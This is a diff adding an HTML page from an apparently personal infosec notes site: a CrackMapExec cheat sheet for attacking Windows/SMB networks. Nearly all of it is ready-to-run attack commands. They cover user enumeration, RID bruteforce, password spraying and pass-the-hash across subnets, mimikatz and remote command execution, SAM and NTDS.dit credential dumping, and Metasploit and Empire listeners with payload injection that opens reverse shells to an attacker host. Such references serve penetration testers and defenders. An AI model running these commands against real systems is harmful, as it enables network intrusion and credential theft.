@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <title>ovelny - amulet/tools-cheatsheets/crackmapexec</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta
+      name="description"
+      content="ovelny - notes on infosec, penetration testing, programming and others"
+    />
+    <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="stylesheet" type=text/css href="/assets/css/dead-simple.min.css">
+    <link rel="stylesheet" type=text/css href="/assets/css/rouge.min.css">
+    <link
+      href="/atom.xml"
+      rel="alternate"
+      title="ovelny"
+      type="application/atom+xml"
+    />
+    <script src="/assets/js/scramble-text.min.js" defer></script>
+    <meta name="twitter:card" content="summary"/>
+    <meta name="twitter:site" content="@ovelny"/>
+    <meta name="twitter:title" content="ovelny - amulet/tools-cheatsheets/crackmapexec"/>
+    <meta name="twitter:image" content="https://ovelny.sh/assets/images/ovelny-logo.png"/>
+    <meta name="twitter:image:alt" content="ovelny logo: 6 white circles grouped together forming a triangle shape, with a black background."/>
+  </head>
+  <body>
+
+    <header>
+      <section>
+        <a href="/">
+          <img
+            class="logo"
+            src="/assets/images/ovelny-minimal-logo.jpg"
+            alt="ovelny logo"
+          />
+        </a>
+        <h2><a class="ovelny" href="/">ovelny</a></h2>
+      </section>
+      <nav>
+        <a href="/now/">now</a>
+        <a href="/amulet/">amulet</a>
+        <a href="/presage/">presage</a>
+        <a
+          href="https://github.com/Ovelny"
+          target="_blank"
+          rel="noopener noreferrer"
+          >github</a
+        >
+        <a href="/atom.xml" target="_blank" rel="noopener noreferrer">rss</a>
+        <a href="/contact/">contact</a>
+      </nav>
+    </header>
+    <main>
+
+    
+    <h1>crackmapexec</h1>
+
+<h2>enumeration</h2>
+
+<div class="highlight"><pre class="highlight shell"><code><span class="c"># enumerate users</span>
+cme smb 192.168.215.104 <span class="nt">-u</span> <span class="s1">'user'</span> <span class="nt">-p</span> <span class="s1">'PASS'</span> <span class="nt">--users</span>
+
+<span class="c"># perform RID bruteforce to get users</span>
+cme smb 192.168.215.104 <span class="nt">-u</span> <span class="s1">'user'</span> <span class="nt">-p</span> <span class="s1">'PASS'</span> <span class="nt">--rid-brute</span>
+
+<span class="c"># enumerate domain groups</span>
+cme smb 192.168.215.104 <span class="nt">-u</span> <span class="s1">'user'</span> <span class="nt">-p</span> <span class="s1">'PASS'</span> <span class="nt">--groups</span>
+
+<span class="c"># enumerate local users</span>
+cme smb 192.168.215.104 <span class="nt">-u</span> <span class="s1">'user'</span> <span class="nt">-p</span> <span class="s1">'PASS'</span> <span class="nt">--local-users</span>
+
+<span class="c"># generate a list of relayable hosts (SMB signing disabled)</span>
+cme smb 192.168.1.0/24 <span class="nt">--gen-relay-list</span> output.txt
+
+<span class="c"># enumerate available shares</span>
+cme smb 192.168.215.138 <span class="nt">-u</span> <span class="s1">'user'</span> <span class="nt">-p</span> <span class="s1">'PASSWORD'</span> <span class="nt">--local-auth</span> <span class="nt">--shares</span>
+
+<span class="c"># get the active sessions</span>
+cme smb 192.168.215.104 <span class="nt">-u</span> <span class="s1">'user'</span> <span class="nt">-p</span> <span class="s1">'PASS'</span> <span class="nt">--sessions</span>
+
+<span class="c"># check logged in users</span>
+cme smb 192.168.215.104 <span class="nt">-u</span> <span class="s1">'user'</span> <span class="nt">-p</span> <span class="s1">'PASS'</span> <span class="nt">--lusers</span>
+
+<span class="c"># get the password policy</span>
+cme smb 192.168.215.104 <span class="nt">-u</span> <span class="s1">'user'</span> <span class="nt">-p</span> <span class="s1">'PASS'</span> <span class="nt">--pass-pol</span>
+</code></pre></div>
+
+<h2>connexions &amp; spraying</h2>
+
+<div class="highlight"><pre class="highlight shell"><code><span class="c"># target format</span>
+cme smb ms.evilcorp.org
+cme smb 192.168.1.0 192.168.0.2
+cme smb 192.168.1.0-28 10.0.0.1-67
+cme smb 192.168.1.0/24
+cme smb targets.txt
+
+<span class="c"># guest / null session</span>
+cme smb 192.168.10.1 <span class="nt">-u</span> <span class="s2">""</span> up <span class="s2">""</span>
+
+<span class="c"># connect to target using local account</span>
+cme smb 192.168.215.138 <span class="nt">-u</span> <span class="s1">'Administrator'</span> <span class="nt">-p</span> <span class="s1">'PASSWORD'</span> <span class="nt">--local-auth</span>
+
+<span class="c"># pass the hash against a subnet</span>
+cme smb 172.16.157.0/24 <span class="nt">-u</span> administrator <span class="nt">-H</span> <span class="s1">'LMHASH:NTHASH'</span> <span class="nt">--local-auth</span>
+cme smb 172.16.157.0/24 <span class="nt">-u</span> administrator <span class="nt">-H</span> <span class="s1">'NTHASH'</span>
+
+<span class="c"># bruteforcing and password spraying</span>
+cme smb 192.168.100.0/24 <span class="nt">-u</span> <span class="s2">"admin"</span> <span class="nt">-p</span> <span class="s2">"password1"</span>
+cme smb 192.168.100.0/24 <span class="nt">-u</span> <span class="s2">"admin"</span> <span class="nt">-p</span> <span class="s2">"password1"</span> <span class="s2">"password2"</span>
+cme smb 192.168.100.0/24 <span class="nt">-u</span> <span class="s2">"admin1"</span> <span class="s2">"admin2"</span> <span class="nt">-p</span> <span class="s2">"P@ssword"</span>
+cme smb 192.168.100.0/24 <span class="nt">-u</span> user_file.txt <span class="nt">-p</span> pass_file.txt
+cme smb 192.168.100.0/24 <span class="nt">-u</span> user_file.txt <span class="nt">-H</span> ntlm_hashFile.txt
+</code></pre></div>
+
+<h2>modules</h2>
+
+<div class="highlight"><pre class="highlight shell"><code><span class="c"># list available modules</span>
+cme smb <span class="nt">-L</span>
+
+<span class="c"># module information</span>
+cme smb <span class="nt">-M</span> mimikatz <span class="nt">--module-info</span>
+
+<span class="c"># view module options</span>
+cme smb <span class="nt">-M</span> mimikatz <span class="nt">--options</span>
+
+<span class="c"># mimikatz module</span>
+cme smb 192.168.215.104 <span class="nt">-u</span> <span class="s1">'Administrator'</span> <span class="nt">-p</span> <span class="s1">'PASS'</span> <span class="nt">--local-auth</span> <span class="nt">-M</span> mimikatz
+cme smb 192.168.215.104 <span class="nt">-u</span> <span class="s1">'Administrator'</span> <span class="nt">-p</span> <span class="s1">'PASS'</span> <span class="nt">-M</span> mimikatz
+cme smb 192.168.215.104 <span class="nt">-u</span> Administrator <span class="nt">-p</span> <span class="s1">'P@ssw0rd'</span> <span class="nt">-M</span> mimikatz <span class="nt">-o</span> <span class="nv">COMMAND</span><span class="o">=</span><span class="s1">'privilege::debug'</span>
+</code></pre></div>
+
+<h2>executing commands</h2>
+
+<div class="highlight"><pre class="highlight shell"><code><span class="c"># crackmapexec has 3 different command execution methods (in default order) :</span>
+<span class="c"># - wmiexec --&gt; wmi</span>
+<span class="c"># - atexec --&gt; scheduled task</span>
+<span class="c"># - smbexec --&gt; creating and running a service</span>
+
+<span class="c"># execute command through cmd.exe (admin privileges required)</span>
+cme smb 192.168.10.11 <span class="nt">-u</span> Administrator <span class="nt">-p</span> <span class="s1">'P@ssw0rd'</span> <span class="nt">-x</span> <span class="s1">'whoami'</span>
+
+<span class="c"># force the smbexec method</span>
+cme smb 192.168.215.104 <span class="nt">-u</span> <span class="s1">'Administrator'</span> <span class="nt">-p</span> <span class="s1">'PASS'</span> <span class="nt">-x</span> <span class="s1">'net user Administrator /domain'</span> <span class="nt">--exec-method</span> smbexec
+
+<span class="c"># execute commands through powershell (admin privileges required)</span>
+cme smb 192.168.10.11 <span class="nt">-u</span> Administrator <span class="nt">-p</span> <span class="s1">'P@ssw0rd'</span> <span class="nt">-X</span> <span class="s1">'whoami'</span>
+</code></pre></div>
+
+<h2>credentials dump</h2>
+
+<div class="highlight"><pre class="highlight shell"><code><span class="c"># dump local SAM hashes</span>
+cme smb 192.168.215.104 <span class="nt">-u</span> <span class="s1">'Administrator'</span> <span class="nt">-p</span> <span class="s1">'PASS'</span> <span class="nt">--local-auth</span> <span class="nt">--sam</span>
+
+<span class="c"># enable or disable wdigest to get credentials from the LSA memory</span>
+cme smb 192.168.215.104 <span class="nt">-u</span> <span class="s1">'Administrator'</span> <span class="nt">-p</span> <span class="s1">'PASS'</span> <span class="nt">--local-auth</span> <span class="nt">--wdigest</span> <span class="nb">enable
+</span>cme smb 192.168.215.104 <span class="nt">-u</span> <span class="s1">'Administrator'</span> <span class="nt">-p</span> <span class="s1">'PASS'</span> <span class="nt">--local-auth</span> <span class="nt">--wdigest</span> disable
+
+<span class="c"># then you juste have to wait the user logoff and logon again</span>
+<span class="c"># but you can force the logoff</span>
+cme smb 192.168.215.104 <span class="nt">-u</span> <span class="s1">'Administrator'</span> <span class="nt">-p</span> <span class="s1">'PASS'</span> <span class="nt">-x</span> <span class="s1">'quser'</span>
+cme smb 192.168.215.104 <span class="nt">-u</span> <span class="s1">'Administrator'</span> <span class="nt">-p</span> <span class="s1">'PASS'</span> <span class="nt">-x</span> <span class="s1">'logoff &lt;sessionid&gt;'</span>
+
+<span class="c"># dump the ntds.dit from dc using methods from secretsdump.py</span>
+
+<span class="c"># uses DRSUAPI rpc interface create a handle, trigger replication</span>
+<span class="c"># and combined with additional DRSUAPI calls to convert the resultant </span>
+<span class="c"># linked-lists into readable format</span>
+cme smb 192.168.1.100 <span class="nt">-u</span> UserNAme <span class="nt">-p</span> <span class="s1">'PASSWORDHERE'</span> <span class="nt">--ntds</span>
+
+<span class="c"># uses the volume shadow copy service</span>
+cme smb 192.168.1.100 <span class="nt">-u</span> UserNAme <span class="nt">-p</span> <span class="s1">'PASSWORDHERE'</span> <span class="nt">--ntds</span> vss
+
+<span class="c"># dump the ntds.dit password history</span>
+smb 192.168.1.0/24 <span class="nt">-u</span> UserNAme <span class="nt">-p</span> <span class="s1">'PASSWORDHERE'</span> <span class="nt">--ntds-history</span>
+</code></pre></div>
+
+<h2>integrated database</h2>
+
+<div class="highlight"><pre class="highlight shell"><code><span class="c"># the database automatically store every hosts reaches by cme and all credentials with admin access</span>
+cmedb
+
+<span class="c"># using workspaces</span>
+cmedb&gt; workspace create <span class="nb">test
+</span>cmedb&gt; workspace <span class="nb">test</span>
+
+<span class="c"># access a protocol database and switch back</span>
+cmedb <span class="o">(</span><span class="nb">test</span><span class="o">)&gt;</span> proto smb
+cmedb <span class="o">(</span><span class="nb">test</span><span class="o">)&gt;</span> back
+
+<span class="c"># list stored hosts</span>
+cmedb&gt; hosts
+
+<span class="c"># view detailed infos for a specific machine (including creds)</span>
+cmedb&gt; hosts &lt;<span class="nb">hostname</span><span class="o">&gt;</span>
+
+<span class="c"># get stored credentials</span>
+cmedb&gt; creds
+
+<span class="c"># get credentials access for a specific account</span>
+cmedb&gt; creds &lt;username&gt;
+
+<span class="c"># using credentials from the database</span>
+cme smb 192.168.100.1 <span class="nt">-id</span> &lt;credsID&gt;
+</code></pre></div>
+
+<h2>getting shells with metasploit</h2>
+
+<div class="highlight"><pre class="highlight shell"><code><span class="c"># first, set up a HTTP reverse handler</span>
+msf <span class="o">&gt;</span> use exploit/multi/handler 
+msf exploit<span class="o">(</span>handler<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>payload windows/meterpreter/reverse_https
+msf exploit<span class="o">(</span>handler<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>LHOST 192.168.10.3
+msf exploit<span class="o">(</span>handler<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>exitonsession <span class="nb">false
+</span>msf exploit<span class="o">(</span>handler<span class="o">)</span> <span class="o">&gt;</span> exploit <span class="nt">-j</span>
+
+<span class="c"># met_inject module</span>
+cme smb 192.168.215.104 <span class="nt">-u</span> <span class="s1">'Administrator'</span> <span class="nt">-p</span> <span class="s1">'PASS'</span> <span class="nt">--local-auth</span> <span class="nt">-M</span> met_inject <span class="nt">-o</span> <span class="nv">LHOST</span><span class="o">=</span>YOURIP <span class="nv">LPORT</span><span class="o">=</span>4444 
+</code></pre></div>
+
+<h2>getting shells with empire</h2>
+
+<div class="highlight"><pre class="highlight shell"><code><span class="c"># start restful API</span>
+empire <span class="nt">--rest</span> <span class="nt">--user</span> empireadmin <span class="nt">--pass</span> gH25Iv1K68@^
+
+<span class="c"># first setup an empire http listener</span>
+<span class="o">(</span>Empire: listeners<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>Name <span class="nb">test</span>
+<span class="o">(</span>Empire: listeners<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>Host 192.168.10.3
+<span class="o">(</span>Empire: listeners<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>Port 9090
+<span class="o">(</span>Empire: listeners<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>CertPath data/empire.pem
+<span class="o">(</span>Empire: listeners<span class="o">)</span> <span class="o">&gt;</span> run
+<span class="o">(</span>Empire: listeners<span class="o">)</span> <span class="o">&gt;</span> list
+
+<span class="c"># start restful API</span>
+<span class="c"># the username and password that CME uses to authenticate to empire's restful api </span>
+<span class="c"># are stored in the cme.conf file located at ~/.cme/cme.conf</span>
+empire <span class="nt">--rest</span> <span class="nt">--user</span> empireadmin <span class="nt">--pass</span> gH25Iv1K68@^
+
+<span class="c"># empire module</span>
+cme smb 192.168.215.104 <span class="nt">-u</span> Administrator <span class="nt">-p</span> PASSWORD <span class="nt">--local-auth</span> <span class="nt">-M</span> empire_exec <span class="nt">-o</span> <span class="nv">LISTENER</span><span class="o">=</span>CMETest
+</code></pre></div>
+
+<h2>references</h2>
+
+<ul>
+<li><a href="https://cheatsheet.haax.fr/windows-systems/exploitation/crackmapexec/" rel="nofollow">https://cheatsheet.haax.fr/windows-systems/exploitation/crackmapexec/</a></li>
+</ul>
+
+    </main>
+    <footer id="footer">
+      <div class="footer-section"><a href="/license/">CC BY-NC-SA 4.0</a><p>&nbsp;::&nbsp;2019 - 2024 ovelny</p></div>
+      <div class="footer-section">「七転び八起き」</div>
+    </footer>
+  </body>
+</html>
+
